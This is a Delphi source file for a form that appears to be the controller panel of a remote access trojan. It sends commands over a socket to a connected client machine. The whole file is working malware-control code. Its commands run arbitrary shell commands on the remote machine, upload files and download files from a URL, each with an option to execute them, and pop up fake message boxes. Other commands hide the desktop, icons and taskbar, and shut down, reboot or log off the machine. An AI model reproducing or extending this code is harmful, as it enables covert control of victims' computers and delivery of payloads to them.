unit UnitMiscellaneous;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, UnitConnection, UnitUtils, UnitCommands,
  ImgList;

type
  TFormMiscellaneous = class(TForm)
    stat1: TStatusBar;
    pgc1: TPageControl;
    ts1: TTabSheet;
    ts2: TTabSheet;
    ts3: TTabSheet;
    lbl1: TLabel;
    edtTitle: TEdit;
    lbl2: TLabel;
    mmoMsg: TMemo;
    lbl3: TLabel;
    cbbIcon: TComboBoxEx;
    lbl4: TLabel;
    cbbButtons: TComboBoxEx;
    btn1: TButton;
    btn2: TButton;
    btn3: TButton;
    btn4: TButton;
    grp1: TGroupBox;
    grp2: TGroupBox;
    edtSpeak: TEdit;
    btn5: TButton;
    grp3: TGroupBox;
    edtWebpage: TEdit;
    btn6: TButton;
    grp4: TGroupBox;
    edtUpload: TEdit;
    btn7: TButton;
    btn8: TButton;
    chk1: TCheckBox;
    grp5: TGroupBox;
    edtDownload: TEdit;
    btn10: TButton;
    chk2: TCheckBox;
    lbl5: TLabel;
    lbl6: TLabel;
    grp6: TGroupBox;
    edtCmd: TEdit;
    btn9: TButton;
    btn11: TButton;
    btn12: TButton;
    dlgOpen1: TOpenDialog;
    grp7: TGroupBox;
    btn13: TButton;
    btn14: TButton;
    btn15: TButton;
    il1: TImageList;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure btn11Click(Sender: TObject);
    procedure btn12Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure btn3Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure btn6Click(Sender: TObject);
    procedure btn9Click(Sender: TObject);
    procedure btn7Click(Sender: TObject);
    procedure btn8Click(Sender: TObject);
    procedure btn10Click(Sender: TObject);
    procedure btn13Click(Sender: TObject);
    procedure btn15Click(Sender: TObject);
    procedure btn14Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    ClientDatas: TClientDatas;
    procedure OnClientRead(Datas: string);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _ClientDatas: TClientDatas);     
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormMiscellaneous: TFormMiscellaneous;

implementation

{$R *.dfm}
         
constructor TFormMiscellaneous.Create(aOwner: TComponent; _ClientDatas: TClientDatas);
begin
  inherited Create(aOwner);
  ClientDatas := _ClientDatas;
end;

procedure TFormMiscellaneous.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormMiscellaneous.WndProc(var Msg: TMessage);
begin
  inherited;
  if Msg.Msg = WM_USER + 12 then OnClientRead(string(Msg.WParam));
end;

procedure TFormMiscellaneous.OnClientRead(Datas: string);
var
  Cmd, i: Integer;
  TmpStr: string;
begin
  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1));
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_MISCELLANEOUS_DESKTOP, CMD_MISCELLANEOUS_DOWNLOAD, CMD_MISCELLANEOUS_ICONS,
    CMD_MISCELLANEOUS_SHELL, CMD_MISCELLANEOUS_SPEAK, CMD_MISCELLANEOUS_TRAY,
    CMD_MISCELLANEOUS_TASKBAR, CMD_MISCELLANEOUS_UPLOAD, CMD_MISCELLANEOUS_WEBPAGE:
    begin
      if Datas = 'Y' then stat1.Panels.Items[0].Text := 'Command executed successfully!' else
        stat1.Panels.Items[0].Text := 'Failed to execute command.';
    end;

    CMD_MISCELLANEOUS_MSG:
    begin
      i := StrToInt(Datas);

      case i of
        IDOK: TmpStr := 'OK';
        IDCANCEL: TmpStr := 'Cancel';
        IDABORT: TmpStr := 'Abort';
        IDRETRY: TmpStr := 'Retry';
        IDIGNORE: TmpStr := 'Ignore';
        IDYES: TmpStr := 'Yes';
        IDNO: TmpStr := 'No';
      end;

      stat1.Panels.Items[0].Text := 'Message showed successfully, user clicked ' + TmpStr + '!';
    end;
  end;
end;

procedure TFormMiscellaneous.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  //
end;

procedure TFormMiscellaneous.FormCreate(Sender: TObject);
begin
  //
end;

procedure TFormMiscellaneous.FormShow(Sender: TObject);
begin
  pgc1.ActivePageIndex := 0;
  cbbIcon.ItemIndex := 0;
  cbbButtons.ItemIndex := 0;
  
  //center window
  Left := (Screen.Width - Width) div 2;
  Top := (Screen.Height - Height) div 2;
end;

procedure TFormMiscellaneous.btn11Click(Sender: TObject);
var
  i, j: Integer;
begin
  i := cbbIcon.ItemIndex;
  j := cbbButtons.ItemIndex;

  case cbbIcon.ItemIndex of
    0:
    case cbbButtons.ItemIndex of
      0: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      1: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      2: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      3: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      4: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      5: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
    end;
        
    1:
    case cbbButtons.ItemIndex of
      0: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      1: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      2: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      3: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      4: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      5: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
    end;

    2:
    case cbbButtons.ItemIndex of
      0: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      1: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      2: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      3: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      4: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      5: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
    end;

    3:
    case cbbButtons.ItemIndex of
      0: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      1: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      2: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      3: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      4: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
      5: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, i, j);
    end;

    4: //no icon message case
    case cbbButtons.ItemIndex of
      0: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, -1, j);
      1: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, -1, j);
      2: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, -1, j);
      3: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, -1, j);
      4: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, -1, j);
      5: MyShowMessage(Handle, mmoMsg.Text, edtTitle.Text, -1, j);
    end;
  end;

  stat1.Panels.Items[0].Text := 'Preview message showed!';
end;

procedure TFormMiscellaneous.btn12Click(Sender: TObject);
var
  i, j: Integer;
begin
  i := cbbIcon.ItemIndex;
  j := cbbButtons.ItemIndex;

  case cbbIcon.ItemIndex of
    0:
    case cbbButtons.ItemIndex of
      0: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      1: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      2: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      3: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      4: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      5: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
    end;
        
    1:
    case cbbButtons.ItemIndex of
      0: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      1: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      2: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      3: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      4: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      5: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
    end;

    2:
    case cbbButtons.ItemIndex of
      0: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      1: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      2: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      3: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      4: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      5: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
    end;

    3:
    case cbbButtons.ItemIndex of
      0: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      1: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      2: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      3: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      4: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
      5: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|' + IntToStr(i) + '|' + IntToStr(j) + '|');
    end;

    4: //no icon message case
    case cbbButtons.ItemIndex of
      0: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|4|' + IntToStr(j) + '|');
      1: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|4|' + IntToStr(j) + '|');
      2: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|4|' + IntToStr(j) + '|');
      3: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|4|' + IntToStr(j) + '|');
      4: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|4|' + IntToStr(j) + '|');
      5: ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_MSG) + '|' + mmoMsg.Text + '|' + edtTitle.Text + '|4|' + IntToStr(j) + '|');
    end;
  end;
     
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn1Click(Sender: TObject);
begin
  case btn1.Tag  of
    0:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_DESKTOP) + '|Y');
      btn1.Tag := 1;
    end;

    1:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_DESKTOP) + '|N');
      btn1.Tag := 0;
    end;
  end;

  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn2Click(Sender: TObject);
begin
  case btn2.Tag  of
    0:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_ICONS) + '|Y');
      btn2.Tag := 1;
    end;

    1:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_ICONS) + '|N');
      btn2.Tag := 0;
    end;
  end;
  
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn3Click(Sender: TObject);
begin
  case btn3.Tag  of
    0:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_TRAY) + '|Y');
      btn3.Tag := 1;
    end;

    1:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_TRAY) + '|N');
      btn3.Tag := 0;
    end;
  end;
  
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn4Click(Sender: TObject);
begin
  case btn4.Tag  of
    0:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_TASKBAR) + '|Y');
      btn4.Tag := 1;
    end;

    1:
    begin
      ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_TASKBAR) + '|N');
      btn4.Tag := 0;
    end;
  end;
  
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn5Click(Sender: TObject);
begin
  if edtSpeak.Text = '' then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_SPEAK) + '|' + edtSpeak.Text);
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn6Click(Sender: TObject);
begin
  if edtWebpage.Text = '' then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_WEBPAGE) + '|' + edtWebpage.Text);
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn9Click(Sender: TObject);
begin
  if edtCmd.Text = '' then Exit;
  ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_SHELL) + '|' + edtCmd.Text);
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn7Click(Sender: TObject);
begin
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'All files (*.*)|*.*';
  if (dlgOpen1.Execute = False) or (dlgOpen1.FileName = '') then Exit;
  edtUpload.Text := dlgOpen1.FileName;
end;

procedure TFormMiscellaneous.btn8Click(Sender: TObject);
begin
  if edtUpload.Text = '' then Exit;

  if chk1.Checked then
    ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_UPLOAD) + '|' +
      ExtractFileName(edtUpload.Text) + '|' + IntToStr(MyGetFileSize(edtUpload.Text)) + '|Y|')
  else ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_UPLOAD) + '|' +
    ExtractFileName(edtUpload.Text) + '|' + IntToStr(MyGetFileSize(edtUpload.Text)) + '|N|');

  ClientDatas.ClientSocket.SendFile(edtUpload.Text, nil);
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn10Click(Sender: TObject);
begin
  if edtDownload.Text = '' then Exit;

  if chk2.Checked then
    ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_DOWNLOAD) + '|' + edtDownload.Text + '|Y|')
  else ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_DOWNLOAD) + '|' + edtDownload.Text + '|N|');

  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormMiscellaneous.btn13Click(Sender: TObject);
begin
  ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_SHUTDOWN) + '|');
end;

procedure TFormMiscellaneous.btn15Click(Sender: TObject);
begin
  ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_REBOOT) + '|');
end;

procedure TFormMiscellaneous.btn14Click(Sender: TObject);
begin
  ClientDatas.SendDatas(IntToStr(CMD_MISCELLANEOUS_LOGOFF) + '|');
end;

end.
